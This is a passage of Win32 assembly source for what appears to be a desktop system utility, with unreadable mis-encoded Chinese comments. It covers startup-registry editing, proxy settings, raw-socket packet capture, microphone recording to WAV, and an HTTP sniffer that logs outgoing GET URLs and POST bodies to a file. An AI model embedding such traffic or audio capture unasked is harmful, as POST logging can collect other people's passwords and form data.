            invoke SendDlgItemMessage,_dwParam,IDC_BUFFERPROCESS,\
                      PBM_SETPOS,dwCurrentFilterProValue,0


            ;���ڴ�д���ļ��Թ����
            invoke CreateFile,addr lpHttpFilterFileName,GENERIC_WRITE,\
                   FILE_SHARE_READ,\
                   0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
            mov hHttpFilterFile,eax

            ;�����������ݰ�����
            invoke CreateThread,NULL,0,offset _ipFilterDeal,_dwParam,\
                   NULL,addr @dwThreadID
            invoke CloseHandle,eax

            ;�����������ݰ�����
            mov bStopRecvPacket,0
            invoke CreateThread,NULL,0,offset _ipFilterReceive,_dwParam,\
                   NULL,addr @dwThreadID
            invoke CloseHandle,eax
            ret
_ipFilter   endp
;--------------------------
; �������-IP��׽֮���ڳ���
;--------------------------
_ProcFilterMain   proc  uses ebx edi esi hProcessFilterDlg:HWND,wMsg,wParam,lParam
          local @dwOff,@dwCount,@dwCount1
          local @dwTemp,@dwTemp1,@dwTemp2,@dwTemp3
          local @dwPreLen,@dwForLen
          local @dwPreOff,@dwForOff
          local @bufTemp[2000]:byte
          local @bufTemp1[10]:byte   
          local @bufTemp2[20]:byte
          local @bufTemp3[2000]:byte  
          local @dwBlanks
          mov eax,wMsg

          .if eax==WM_CLOSE
             invoke GlobalFree,lpMaxBuffer
             invoke GlobalFree,lpMaxDWBuffer
             invoke EndDialog,hProcessFilterDlg,NULL
          .elseif eax==WM_INITDIALOG
             invoke GetDlgItem,hProcessFilterDlg,IDC_FILTERTABLE
             mov hHttpFilterTable,eax
             invoke SendMessage,hHttpFilterTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_GRIDLINES or LVS_EX_FULLROWSELECT
             invoke ShowWindow,hHttpFilterTable,SW_SHOW
             invoke _clearFilterView
             invoke SetDlgItemInt,hProcessFilterDlg,IDC_FILTERPORT,\
                    dwHttpFilterBindingPort,FALSE
             mov dwFilterStarted,0
          .elseif eax==WM_NOTIFY
            mov eax,lParam
            mov ebx,lParam
            ;���ĸ��ؼ�״̬
            mov eax,[eax+NMHDR.hwndFrom]
            .if eax==hHttpFilterTable
                mov ebx,lParam
                .if [ebx+NMHDR.code]==NM_CLICK
                    assume ebx:ptr NMLISTVIEW
                    mov eax,[ebx].iItem
                    mov dwFilterLineIndex,eax
                    .if dwFilterLineIndex
                      invoke RtlZeroMemory,addr szBuffer,50
                      invoke _GetListViewItem,hHttpFilterTable,dwFilterLineIndex,0,\
                          addr szBuffer
                      ;���õ����ַ���ת��Ϊ����
                      invoke atodw,addr szBuffer
                      mov @dwOff,eax
                      ;��ø���ʼλ��,(���-1)��4
                      dec eax
                      xor edx,edx
                      mov ecx,4
                      mul ecx
                      add eax,lpMaxDWBuffer
                      mov edi,eax
                      mov eax,dword ptr [edi]
                      mov @dwPreOff,eax
                      mov eax,dword ptr [edi+4]
                      mov @dwForOff,eax

                      ;�õ������ݰ�����
                      sub eax,@dwPreOff
                      mov @dwPreLen,eax   ;����

                      ;�ӻ������ж�ȡ���ݰ�����
                      invoke MemCopy,@dwPreOff,addr szNewBuffer,@dwPreLen

                      ;��ʾ��ȡ��������
                      invoke RtlZeroMemory,addr @bufTemp1,10
                      invoke RtlZeroMemory,addr @bufTemp2,20
                      invoke RtlZeroMemory,addr lpServicesBuffer,10*1024
                      invoke RtlZeroMemory,addr bufDisplay,2000

                      mov @dwCount,1
                      mov esi,offset szNewBuffer
                      mov edi,offset bufDisplay

                      mov @dwCount1,0
                      invoke wsprintf,addr @bufTemp2,addr lpszFilterFmt4,@dwCount1
                      invoke lstrcat,addr lpServicesBuffer,addr @bufTemp2

                      ;�����һ�еĿո�����16�����ȣ�16��*3
                      xor edx,edx
                      mov eax,@dwPreLen
                      mov ecx,16
                      div ecx
                      mov eax,16
                      sub eax,edx
                      xor edx,edx
                      mov ecx,3
                      mul ecx
                      mov @dwBlanks,eax
                      .while TRUE
                         .if @dwPreLen==0
                            ;���ո�
                            .while TRUE
                              .break .if @dwBlanks==0
                              invoke lstrcat,addr lpServicesBuffer,addr lpszBlank
                              dec @dwBlanks
                            .endw
                            invoke lstrcat,addr lpServicesBuffer,addr lpszManyBlanks  ;�����ո�
                            invoke lstrcat,addr lpServicesBuffer,addr bufDisplay      ;��ʾ�ַ�  
                            invoke lstrcat,addr lpServicesBuffer,addr lpszReturn
                            .break
                         .endif
                         mov al,byte ptr [esi]
                         ;��al����ɿ�����ʾ��ascii���ַ�,ע�ⲻ���ƻ�al��ֵ
                         .if al>20h && al<7eh
                           mov ah,al
                         .else
                           mov ah,2Eh
                         .endif
                         mov byte ptr [edi],ah

                         ;win2k��֧��al�ֽڼ��𣬾������³����޹ʽ�������������·������wsprintf
                         ;invoke wsprintf,addr @bufTemp1,addr lpszFilterFmt3,al
                         
                         mov bl,al
                         xor edx,edx
                         xor eax,eax
                         mov al,bl
                         mov cx,16
                         div cx   ;�����λ��al�У�������dl��

                         push edi
                         xor bx,bx
                         mov bl,al
                         movzx edi,bx
                         mov bl,byte ptr lpszHexArr[edi]
                         mov byte ptr @bufTemp1[0],bl

                         xor bx,bx
                         mov bl,dl
                         movzx edi,bx
                         mov bl,byte ptr lpszHexArr[edi]
                         mov byte ptr @bufTemp1[1],bl
                         mov bl,20h
                         mov byte ptr @bufTemp1[2],bl
                         mov bl,0
                         mov byte ptr @bufTemp1[3],bl
                         pop edi

                         invoke lstrcat,addr lpServicesBuffer,addr @bufTemp1
                        .if @dwCount==16
                            invoke lstrcat,addr lpServicesBuffer,addr lpszManyBlanks  ;�����ո�
                            invoke lstrcat,addr lpServicesBuffer,addr bufDisplay      ;��ʾ�ַ�  
                            invoke lstrcat,addr lpServicesBuffer,addr lpszReturn      ;�س�����
                            inc @dwCount1
                            invoke wsprintf,addr @bufTemp2,addr lpszFilterFmt4,@dwCount1
                            invoke lstrcat,addr lpServicesBuffer,addr @bufTemp2
                            dec @dwCount1
                            mov @dwCount,0
                            invoke RtlZeroMemory,addr bufDisplay,2000
                            mov edi,offset bufDisplay
                            dec edi
                        .endif
                        dec @dwPreLen
                        inc @dwCount
                        inc esi
                        inc edi
                        inc @dwCount1
                      .endw
                      invoke SetDlgItemText,hProcessFilterDlg,IDC_FILTERCONTENT,addr lpServicesBuffer
                    .endif
                .endif
            .endif
          .elseif eax==WM_COMMAND
             mov eax,wParam
             .if ax==IDC_STARTCAPTURE  ;��ʼ��׽
                .if dwFilterStarted  ;�Ѿ���ʼ��׽�ˣ���ֹͣ
                   
                   invoke SetDlgItemText,hProcessFilterDlg,IDC_STARTCAPTURE,addr lpszFilterStart
                   mov dwFilterStarted,0
                .else   ;��δ��ʼ��׽����ʼ

                   invoke _clearFilterView
                   invoke _ipFilter,hProcessFilterDlg
                   invoke SetDlgItemText,hProcessFilterDlg,IDC_STARTCAPTURE,addr lpszFilterStop
                   mov dwFilterStarted,1
                .endif
             .elseif ax==IDC_FILTERPORT  ;��ѡ����ĳһ��ģ���

             .endif
         .else
             mov eax,FALSE
             ret
         .endif
         mov eax,TRUE
         ret
_ProcFilterMain    endp

_clearStartupView  proc uses ebx ecx
            invoke _ListViewClear,hRegStartupTable
            ;��ӱ�ͷ
            mov ebx,1
            mov eax,100
            lea ecx,szRegColName1

            invoke _ListViewAddColumn,hRegStartupTable,ebx,eax,ecx

            mov ebx,2
            mov eax,400
            lea ecx,szRegColName2
            invoke _ListViewAddColumn,hRegStartupTable,ebx,eax,ecx

            mov ebx,3
            mov eax,65
            lea ecx,szRegColName3
            invoke _ListViewAddColumn,hRegStartupTable,ebx,eax,ecx

            mov dwCount,0
            ret
_clearStartupView  endp


_clearServiceView  proc uses ebx ecx
            invoke _ListViewClear,hRegServiceTable
             ;��ӱ�ͷ
             mov ebx,1
             mov eax,100
             lea ecx,szRegServiceColName1
             invoke _ListViewAddColumn,hRegServiceTable,ebx,eax,ecx

             mov ebx,2
             mov eax,200
             lea ecx,szRegServiceColName2
             invoke _ListViewAddColumn,hRegServiceTable,ebx,eax,ecx

             mov ebx,3
             mov eax,65
             lea ecx,szRegServiceColName3
             invoke _ListViewAddColumn,hRegServiceTable,ebx,eax,ecx

             mov ebx,4
             mov eax,200
             lea ecx,szRegServiceColName4
             invoke _ListViewAddColumn,hRegServiceTable,ebx,eax,ecx

             mov dwCount,0
             ret
_clearServiceView  endp

;----------------------------------
; ö��Run��֧�µļ�����ӵ������
;----------------------------------
_EnumStartupItems proc uses ebx ecx
      local @dwIndex,@hKey
      local @dwSize,@dwSize1,@dwType

      ;��ʼ��������,ע�⣺�����˱��˵ģ������Ͽ���������
      invoke RtlZeroMemory,addr szBuffer,512
      invoke RtlZeroMemory,addr szClassNameBuf,512
      invoke _clearStartupView ;��ձ������

      mov @dwIndex,0

      invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,addr lpszKey,NULL,\
             KEY_QUERY_VALUE,addr @hKey
      .if eax==ERROR_SUCCESS
        .while TRUE
           mov @dwSize,sizeof szBuffer
           mov @dwSize1,sizeof szClassNameBuf
           invoke RegEnumValue,@hKey,@dwIndex,addr szBuffer,\
                  addr @dwSize,NULL,addr @dwType,addr szClassNameBuf,\
                  addr @dwSize1
           .break .if eax==ERROR_NO_MORE_ITEMS

           mov eax,@dwType
           .if eax==REG_SZ
             ;�ڱ��������һ��
             invoke _ListViewSetItem,hRegStartupTable,dwCount,-1,addr szBuffer
             mov dwCount,eax
             xor ebx,ebx
             invoke _ListViewSetItem,hRegStartupTable,dwCount,ebx,\
                    addr szBuffer
             inc ebx
             invoke _ListViewSetItem,hRegStartupTable,dwCount,ebx,\
                    addr szClassNameBuf
             inc ebx
             invoke _ListViewSetItem,hRegStartupTable,dwCount,ebx,\
                    addr lpszStartupType1
             inc dwCount

             invoke RtlZeroMemory,addr szBuffer,512
             invoke RtlZeroMemory,addr szClassNameBuf,512

           .endif
           inc @dwIndex
        .endw
        invoke RegCloseKey,@hKey
      .endif
      ret 
_EnumStartupItems endp

;----------------------------
; ע���������ѡ��Ի���
; ��ʾ���ڻص������У�����uses ebx edi esi ������WIN2000�л��������
;      �򿪵Ĵ����޷��رգ���Щ������Ī���������ȥ��Ϊʲô�أ�
;----------------------------
_RegStartupDlgProc  proc uses ebx edi esi hRegWnd:dword,uMsg:dword,\
                wParam:dword,lParam:dword
         .if uMsg==WM_NOTIFY   ;"Ӧ�ð�ť������"
            mov eax,lParam
            mov ebx,lParam
            ;���ĸ��ؼ�״̬
            mov eax,[eax+NMHDR.hwndFrom]
            .if eax==hRegStartupTable
                mov ebx,lParam
                .if [ebx+NMHDR.code]==NM_CLICK
                    assume ebx:ptr NMLISTVIEW
                    mov eax,[ebx].iItem
                    mov dwStartupLineIndex,eax
                    invoke GetDlgItem,hRegWnd,IDC_STARTUPDEL
                    invoke EnableWindow,eax,TRUE
                .endif
            .endif
         .elseif uMsg==WM_INITDIALOG  ;�Ի����ʼ��
             invoke GetDlgItem,hRegWnd,IDC_STARTUPTABLE
             mov hRegStartupTable,eax
             invoke SendMessage,hRegStartupTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_GRIDLINES or LVS_EX_FULLROWSELECT
             invoke ShowWindow,hRegStartupTable,SW_SHOW
             ;��ӱ�ͷ
             ;Run-0   RunOnce-1  RunOnceEX-2 RunService-3 RunServiceOnce-4
             ;Startup-5  win.ini-6   system.ini-7
             
             mov dwCount,0
             invoke _EnumStartupItems   ;��ʾ������Ŀֵ

             invoke EnableWindow,hApplyButton,FALSE
         .elseif uMsg==WM_COMMAND
            mov eax,wParam
             .if ax==IDC_STARTUPRESH      ;ˢ��
                 invoke _EnumStartupItems
             .elseif ax==IDC_STARTUPDEL   ;ɾ��
                 ;ɾ��ָ���кŶ�Ӧ��������Ŀ
                 invoke RtlZeroMemory,addr szBuffer,512
                 invoke _GetListViewItem,hRegStartupTable,dwStartupLineIndex,0,\
                        addr szBuffer
                 invoke _RegDelValue,addr lpszKey,addr szBuffer
                 invoke RtlZeroMemory,addr szBuffer,512

                 invoke _EnumStartupItems
             .endif
         .elseif uMsg==WM_CLOSE
           invoke DestroyWindow,hRegWnd
         .else
           mov eax,FALSE
           ret
         .endif
         mov eax,TRUE  
         ret
_RegStartupDlgProc  endp

;------------------------------
; ��ʾ�������ã���Ҫ��IP��ַ�Ͷ˿�
;------------------------------
_getProxyServerInfo  proc _hWnd
         local @hKey,@dwSize,@dwType
         local @flag,@start,@end,@dwValue
         local @port[10]:byte
         local @ip[20]:byte
         
         invoke RtlZeroMemory,addr szBuffer,512
         invoke RegOpenKeyEx,HKEY_CURRENT_USER,addr lpszDisProxySetKey,NULL,\
                KEY_QUERY_VALUE,addr @hKey
         .if eax==ERROR_SUCCESS
            invoke RegQueryValueEx,@hKey,addr lpszProxyServerN,NULL,\
                   addr @dwType,addr szBuffer,addr @dwSize
            .if eax==ERROR_SUCCESS
               ;ȡ��szBuffer�е�IP��ַ�Ͷ˿ڣ����ܵĸ�ʽ�У�
               ;"10.121.43.100:808"
               ;����"ftp=10.121.43.100:808;gopher=10.121.43.100:808......"
               ;����Ҫ�ж��Ƿ��зֺ�
               ;�ֺ�3bh��ð��3ah�����ں�Ϊ3dh
               invoke RtlZeroMemory,addr @port,sizeof @port
               invoke RtlZeroMemory,addr @ip,sizeof @ip

               mov esi,0
               mov @flag,0
               .while TRUE
                  @@:
                  mov al,byte ptr [szBuffer+esi]
                  .break .if al==0
                  inc esi
                  cmp al,3bh
                  jnz @B
                  mov @flag,1
                  dec esi
                  .break
               .endw

               ;����зֺţ�����˵�ð�Ŵ����м�Ϊ�˿ڣ���ð�Ż��˵��������м�ΪIP��ַ
               .if @flag==1
                  dec esi
                  mov @end,esi
                  .while TRUE
                     mov al,byte ptr [szBuffer+esi]
                     .break .if al==3ah
                     dec esi
                  .endw
                  
                  mov @start,esi
                  inc @start

                  ;��@start��@end�Ƕ˿ڵ�ֵ
                  push esi

                  mov esi,@start
                  mov edi,0
                  .while TRUE
                     mov al,byte ptr [szBuffer+esi]
                     .break .if al==3bh
                     mov byte ptr [@port+edi],al
                     inc esi
                     inc edi
                  .endw
                  pop esi

                  dec esi
                  mov @end,esi
                  .while TRUE
                     mov al,byte ptr [szBuffer+esi]
                     .break .if al==3dh
                     dec esi
                  .endw
                  mov @start,esi
                  inc @start
                  ;��@start��@end��ip��ַ��ֵ
                  push esi

                  invoke RtlZeroMemory,addr @ip,sizeof @ip
                  mov esi,@start
                  mov edi,0
                  .while TRUE
                     mov al,byte ptr [szBuffer+esi]
                     .break .if al==3ah
                     mov byte ptr [@ip+edi],al
                     inc esi
                     inc edi
                  .endw
               ;���û�зֺţ���ð�Ŵ�ΪIP��ַ������0h����Ϊ�˿�
               .else
                  mov esi,0
                  mov edi,0
                  .while TRUE
                     mov al,byte ptr [szBuffer+esi]
                     .break .if al==3ah
                     mov byte ptr [@ip+edi],al
                     inc esi
                     inc edi
                  .endw
                  
                  inc esi
                  mov edi,0
                  .while TRUE
                     mov al,byte ptr [szBuffer+esi]
                     .break .if al==0
                     mov byte ptr [@port+edi],al
                     inc esi
                     inc edi
                  .endw
               .endif
               ;��IP��ַ�Ͷ˿����뵽�ؼ���
               invoke SetDlgItemText,_hWnd,IDC_PROXYIP,addr @ip
               invoke SetDlgItemText,_hWnd,IDC_PROXYPORT,addr @port
            .endif
            invoke RegCloseKey,@hKey
         .endif
         ret
_getProxyServerInfo  endp
;----------------------------
; ������Ͽ��е�ѡ��������
;----------------------------
_EnableProxyOptions proc _hWnd,_dwFlag
         .if _dwFlag
            invoke GetDlgItem,_hWnd,IDC_IEGROUP
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hWnd,IDC_PROXYIP
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hWnd,IDC_PROXYPORT
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hWnd,IDC_SETPROXY
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hWnd,IDC_STATICIE1
            invoke EnableWindow,eax,TRUE
            invoke GetDlgItem,_hWnd,IDC_STATICIE2
            invoke EnableWindow,eax,TRUE
         .else
            invoke GetDlgItem,_hWnd,IDC_IEGROUP
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hWnd,IDC_PROXYIP
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hWnd,IDC_PROXYPORT
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hWnd,IDC_SETPROXY
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hWnd,IDC_STATICIE1
            invoke EnableWindow,eax,FALSE
            invoke GetDlgItem,_hWnd,IDC_STATICIE2
            invoke EnableWindow,eax,FALSE
            ;ɾ��ע�������Ӧ��ֵ
            invoke _RegDelValue,addr lpszDisProxySetKey,addr lpszDisProxySetName
            invoke _RegDelValue,addr lpszDisProxySetKey,addr lpszProxyOverrideN
            invoke _RegDelValue,addr lpszDisProxySetKey,addr lpszProxyServerN
         .endif
         ret
_EnableProxyOptions endp


_writeWavFileHead  proc
         local @dwDataLen,@dwTemp
         local @dwBuffer
         local @dwSize
         local @tmp1,@tmp2

         ;��дWAV�ļ�ͷ���������ȵ�ֵ
         invoke CreateFile,addr szWavSaveFile,GENERIC_WRITE,\
                FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,\
                NULL
         mov hWavFile,eax
         invoke GetFileSize,hWavFile,NULL
         mov @dwSize,eax

         ;�ļ����ȣ�8Ϊͷ���ȣ����ݳ���
         mov @tmp1,8
         fild @dwSize
         fild @tmp1
         fsub
         fistp @dwSize

         invoke SetFilePointer,hWavFile,4,NULL,FILE_BEGIN
         invoke WriteFile,hWavFile,addr @dwSize,4,addr @dwTemp,NULL

         ;24+sizeof WAVEFORMATEX
         mov @tmp1,24
         mov @tmp2,sizeof WAVEFORMATEX
         fild @tmp1
         fild @tmp2
         fadd
         fistp @dwTemp

         ;�ļ����ȣ�46Ϊ���ݳ���
         mov @tmp1,46
         fild @dwSize
         fild @tmp1
         fsub
         fistp @dwSize

         invoke SetFilePointer,hWavFile,@dwTemp,NULL,FILE_BEGIN
         invoke WriteFile,hWavFile,addr @dwSize,4,addr @dwTemp,NULL
         invoke CloseHandle,hWavFile

         ret
_writeWavFileHead  endp
_WaveCallBack  proc  uses ebx edi ecx esi _hWaveIn,uMsg,_dwInstance,_dwParam1,_dwParam2
     local @dwDataLen,@dwTemp
     local @dwBuffer
     local @dwSize
     local @tmp1,@tmp2

     .if uMsg==MM_WIM_CLOSE
         .if dwDataLength==0
             ret
         .endif

         invoke waveInUnprepareHeader,_hWaveIn,addr inBuffer1, sizeof WAVEHDR
         invoke waveInUnprepareHeader,_hWaveIn,addr inBuffer2, sizeof WAVEHDR

         invoke GlobalFree,addr inBuffer1
         invoke GlobalFree,addr inBuffer2

         mov bRecording,0

         invoke _writeWavFileHead
     .elseif uMsg==MM_WIM_OPEN   ;����
         mov bRecording,1
         mov bEnding,0
     .elseif uMsg==MM_WIM_DATA  ;���򿪵���Ƶ�豸�յ�����ʱ
         .if bEnding
             invoke GlobalFree,addr szNewBuffer
             ret
         .else
            mov esi,_dwParam1
            assume esi: ptr WAVEHDR

            fild dwDataLength
            fild [esi].dwBytesRecorded
            fadd
            fistp @dwDataLen
            assume esi:nothing

            ;���·����ڴ�
            invoke GlobalReAlloc,addr szNewBuffer,@dwDataLen,NULL

            mov ebx,_dwParam1
            assume ebx: ptr WAVEHDR
            ;�����ݴ�ͷ�����и��Ƶ���������ڴ����λ�ã��������ڴ�����ָ��dwDataLength
            mov esi,[[ebx].lpData]
            mov edi,offset szNewBuffer
            add edi,dwDataLength
            mov ecx,[ebx].dwBytesRecorded
            rep movsb

            push @dwDataLen
            pop dwDataLength

            ;�����׽�����ݳ��ȴ���10K����ʼ��������
            .if dwDataLength>=2048
               ;���ڴ�����д���ļ���
               .if bRecording
                 invoke CreateFile,addr szWavSaveFile,GENERIC_WRITE,\
                        FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,\
                        NULL
                 mov hWavFile,eax
                 invoke SetFilePointer,hWavFile,0,NULL,FILE_END
                 invoke WriteFile,hWavFile,addr szNewBuffer,dwDataLength,addr @dwTemp,NULL
                 invoke CloseHandle,hWavFile
               .endif
               invoke GlobalFree,addr szNewBuffer
               invoke GlobalReAlloc,addr szNewBuffer,2048,NULL
               mov dwDataLength,0
            .endif

            assume ebx:nothing

            ;Ϊ�����豸ָ���µ��ڲ�����
            invoke waveInAddBuffer,_hWaveIn,_dwParam1,sizeof WAVEHDR
         .endif
     .endif
     ret
_WaveCallBack  endp

_StartRecord    proc
         local @hInputDev,@dwTemp
         local @waveInCaps:WAVEINCAPS 
         local @waveForm:WAVEFORMATEX

         mov dwDataLength,0
         invoke waveInGetNumDevs   ;��ȡ¼��Ӳ���豸����
         ;����¼����ʽ
         mov @waveForm.wFormatTag,WAVE_FORMAT_PCM
         mov @waveForm.nChannels,2;
         mov @waveForm.nSamplesPerSec,22050;
         mov @waveForm.nAvgBytesPerSec,22050;
         mov @waveForm.nBlockAlign,1;
         mov @waveForm.wBitsPerSample,8;
         mov @waveForm.cbSize,0;
    
         ;���豸
         invoke waveInOpen,addr hWaveIn,WAVE_MAPPER,addr @waveForm,\
                addr _WaveCallBack,0,CALLBACK_FUNCTION 


         ;׼��������
         mov inBuffer1.lpData,offset szWaveInBuffer1
         mov inBuffer1.dwBufferLength,sizeof szWaveInBuffer1
         mov inBuffer1.dwBytesRecorded,0
         mov inBuffer1.dwUser,0
         mov inBuffer1.dwFlags,0
         mov inBuffer1.dwLoops,1
         mov inBuffer1.lpNext,NULL
         invoke waveInPrepareHeader,hWaveIn,addr inBuffer1,sizeof WAVEHDR

         mov inBuffer2.lpData,offset szWaveInBuffer2
         mov inBuffer2.dwBufferLength,sizeof szWaveInBuffer2
         mov inBuffer2.dwBytesRecorded,0
         mov inBuffer2.dwUser,0
         mov inBuffer2.dwFlags,0
         mov inBuffer2.dwLoops,1
         mov inBuffer2.lpNext,NULL
         invoke waveInPrepareHeader,hWaveIn,addr inBuffer2,sizeof WAVEHDR

         ;���������ݻ�������ӵ������豸��
	  invoke waveInAddBuffer,hWaveIn,addr inBuffer1,sizeof WAVEHDR
	  invoke waveInAddBuffer,hWaveIn,addr inBuffer2,sizeof WAVEHDR
	
         ;��ʼ¼��
	  invoke waveInStart,hWaveIn

         ;дWAV�ļ�ͷ
         invoke CreateFile,addr szWavSaveFile,GENERIC_WRITE,\
                FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,\
                NULL
         mov hWavFile,eax
         invoke WriteFile,hWavFile,addr szRIFF,4,addr @dwTemp,NULL
         invoke WriteFile,hWavFile,addr szTotalLength,4,addr @dwTemp,NULL
         invoke WriteFile,hWavFile,addr szWAVE,4,addr @dwTemp,NULL
         invoke WriteFile,hWavFile,addr szFMT,4,addr @dwTemp,NULL
         invoke WriteFile,hWavFile,addr szWaveFormLength,4,addr @dwTemp,NULL
         invoke WriteFile,hWavFile,addr @waveForm,sizeof WAVEFORMATEX,addr @dwTemp,NULL
         invoke WriteFile,hWavFile,addr szDATA,4,addr @dwTemp,NULL
         invoke WriteFile,hWavFile,addr szWavDataLength,4,addr @dwTemp,NULL
         invoke CloseHandle,hWavFile

         ret
_StartRecord    endp

;------------------------
; ������¼���ݰ�����
;------------------------
_httpFilterReceive  proc  uses ebx esi edi _lParam
            local @stFdSet:fd_set
            local @stTimeval:timeval
            local @line
            local @dwLen
            local @dwSourceIP

            mov dwReceiveTimeout,10000  ;10ms
            invoke inet_addr,addr lpszLocalIP
            mov @dwSourceIP,eax

       
            .while TRUE
             .if !bStopRecvPacket
                ;�������ݰ�
                invoke recv,hRecvSocket,addr recvBuffer,sizeof recv_tcp,0
                mov @dwLen,eax

                ;���ݰ��а�������               
                .if @dwLen>40
                  ;�������ݰ�
                  mov eax,@dwSourceIP 
                  mov ecx,6
                  ;�����TCPЭ��������Ұ���Դ��ַΪ����IP��ַ�����ݰ������ŵ�������    
                  .if eax==recvBuffer.ip.ip_src && cl==recvBuffer.ip.ip_p
                     ;��������1
                     invoke SetDlgItemInt,_lParam,IDC_IEADDR,\
                         dwReceivePackets,FALSE
                     ;��λд������ָ�룬��������������������´ӻ�����ͷ����ʼ��串��ԭ��������
                     mov eax,@dwLen
                     add eax,lpBufferWrite
                     .if eax>lpMaxEndBuffer
                         mov eax,offset lpMaxBuffer
                         mov lpBufferWrite,eax
                     .endif

                     ;�������Ƶ�������
                     invoke MemCopy,addr recvBuffer,lpBufferWrite,@dwLen
                     inc dwReceivePackets
                     mov eax,@dwLen
                     add eax,lpBufferWrite
                     mov lpBufferWrite,eax
                  .endif
                .endif
              .endif
            .endw
            ret
_httpFilterReceive  endp


;-------------------------
; ������¼���ݰ�����
;-------------------------
_httpFilterDeal  proc  uses ebx esi edi _lParam
         local @dwTemp,@dwTemp1,@dwTemp2,@dwTemp3
         local @dwLen,@dwOff,@flag
         local @bufTemp[2000]:byte
         local @bufTemp1[1500]:byte
         local @bufPara[1500]:byte

         .while TRUE
           ;����������ݰ�����С�ڽ��յ����ݰ�����ʱ������������������������1ms
           mov eax,dwReceivePackets
           .if dwDealedPackets<eax
             invoke SetDlgItemInt,_lParam,IDC_PROXYIP,\
                    lpBufferRead,FALSE

             mov esi,lpBufferRead
             assume esi:ptr send_ip
             movzx eax,[esi].ip.ip_len
             invoke ntohs,eax
             mov @dwLen,eax

             mov eax,lpBufferRead
             mov @dwTemp,eax
             add @dwTemp,40   ;Խ��IP��TCP���ݰ�ͷ

             mov eax,@dwLen
             sub eax,40
             mov @dwTemp1,eax

             invoke RtlZeroMemory,addr bufDisplay,2000
             invoke RtlZeroMemory,addr @bufTemp,2000
             invoke RtlZeroMemory,addr @bufTemp1,1500
             invoke RtlZeroMemory,addr @bufPara,1500

             invoke MemCopy,@dwTemp,addr bufDisplay,@dwTemp1

             invoke InString,1,addr bufDisplay,addr lpszHttpGet  ;����GET
             mov @dwOff,eax
             .if @dwOff==1
                 invoke InString,1,addr bufDisplay,addr lpszHttp10
                 sub eax,@dwOff
                 sub eax,4         ;����"GET "
                 mov @dwTemp,eax

                 mov @dwTemp1,offset bufDisplay
                 add @dwTemp1,4

                 invoke MemCopy,@dwTemp1,addr @bufTemp,@dwTemp
                  mov @flag,0
                  invoke InString,1,addr @bufTemp,addr lpszFilterJPG
                  .if eax
                    mov @flag,1
                  .endif
                  invoke InString,1,addr @bufTemp,addr lpszFilterjpg
                  .if eax
                    mov @flag,1
                  .endif
                  invoke InString,1,addr @bufTemp,addr lpszFilterJpg
                  .if eax
                    mov @flag,1
                  .endif
                  invoke InString,1,addr @bufTemp,addr lpszFilterGif
                  .if eax
                    mov @flag,1
                  .endif
                  invoke InString,1,addr @bufTemp,addr lpszFilterGIF
                  .if eax
                    mov @flag,1
                  .endif
                  invoke InString,1,addr @bufTemp,addr lpszFiltergif
                  .if eax
                    mov @flag,1
                  .endif
                  .if !@flag   ;����ͼƬ��ַ
                     invoke _writeBufferToFile,hHttpFilterFile,addr @bufTemp
                  .endif
             .else
               invoke InString,1,addr bufDisplay,addr lpszHttpPost  ;����POST
               mov @dwOff,eax
               .if @dwOff==1
                  invoke InString,1,addr bufDisplay,addr lpszHttp10
                  sub eax,@dwOff
                  sub eax,5+1         ;����"POST "��"HTTP/1.0"ǰ�Ŀո�
                  mov @dwTemp,eax

                  mov @dwTemp1,offset bufDisplay
                  add @dwTemp1,5

                  ;ȡPOST����,ǰ���������س����з�
                  invoke InString,1,addr bufDisplay,addr lpszDoubleReturn
                  mov @dwTemp2,eax
                  ;�����������
                  invoke lstrlen,addr bufDisplay
                  sub eax,@dwTemp2
                  sub eax,4
                  mov @dwTemp3,eax
                  ;������ʼλ��
                  mov eax,offset bufDisplay
                  add @dwTemp2,eax
                  add @dwTemp2,4-1

                  invoke MemCopy,@dwTemp2,addr @bufPara,@dwTemp3
                  invoke MemCopy,@dwTemp1,addr @bufTemp1,@dwTemp
                  invoke wsprintf,addr @bufTemp,addr lpszHttpFilterFmt2,addr @bufTemp1,addr @bufPara
                  invoke _writeBufferToFile,hHttpFilterFile,addr @bufTemp
               .endif
             .endif
             assume esi:nothing

             inc dwDealedPackets
             mov eax,@dwLen
             add lpBufferRead,eax   
           .else
             invoke Sleep,1
           .endif
         .endw
         ret
_httpFilterDeal  endp


;---------------------------
; ����������¼
;---------------------------
_httpFilter  proc  uses esi edi ebx _dwParam
            local @addrLocal:sockaddr_in
            local @dwSourceIP
            local @dwValue
            local @dwThreadID
            local @stWsa:WSADATA
            local @dwFlag


            mov @dwFlag,TRUE
            mov @dwValue,1   ;Ϊ1ʱִ��

            ;����30M�ڴ�
            invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_BUFFER_SIZE
            .if eax
               mov lpMaxBuffer,eax
            .else
               invoke showERR,addr lpszErrNoMemory
               ret
            .endif

            invoke WSAStartup,0202h,addr @stWsa
            invoke _getLocalIP
            invoke inet_addr,addr lpszLocalIP
            mov @dwSourceIP,eax

            ;����������
            invoke socket,AF_INET,SOCK_RAW,IPPROTO_IP
            mov hRecvSocket,eax
            .if eax==INVALID_SOCKET
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            ;�Լ����IP��ͷ
            invoke setsockopt,hRecvSocket,IPPROTO_IP,IP_HDRINCL,addr @dwFlag,sizeof @dwFlag
            .if eax==SOCKET_ERROR
               invoke wsprintf,addr szBuffer,addr szOut,eax
               invoke MessageBox,NULL,addr lpszOne,NULL,MB_OK
            .endif
